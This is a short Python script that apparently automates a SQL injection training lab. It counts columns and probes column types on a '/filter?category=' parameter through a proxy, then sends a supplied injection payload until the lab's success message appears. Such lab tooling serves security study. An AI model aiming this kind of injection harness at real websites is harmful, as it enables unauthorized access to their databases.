import requests
import re
from urllib.parse import quote
from proxies import proxies
from sqli_utils import *
import json

def solve(url: str, payload: str):
    r = requests.session()
    
    col_count = sqli_count_columns(r, url + '/filter?category=')
    
    if not col_count:
        print("[!] Error retrieving column count...")
        return []
    
    col_types = get_column_types(r, url + '/filter?category=', column_count=col_count)

    for i in range(len(col_types)):
        print("[~] Testing payload: {}".format(url + '/filter?category=' + quote(payload)))
        res = r.get(url + '/filter?category=' + quote(payload), verify=False, proxies=proxies)
        if res.status_code == 504:
            print("[!] Error 504: Session Timeout")
            return False
        elif res.status_code == 500:
            print("[!] Error 500: Invalid SQLi")

        if "Congratulations, you solved the lab!" in res.text:
            print("[+] ================================")
            return True

    return False
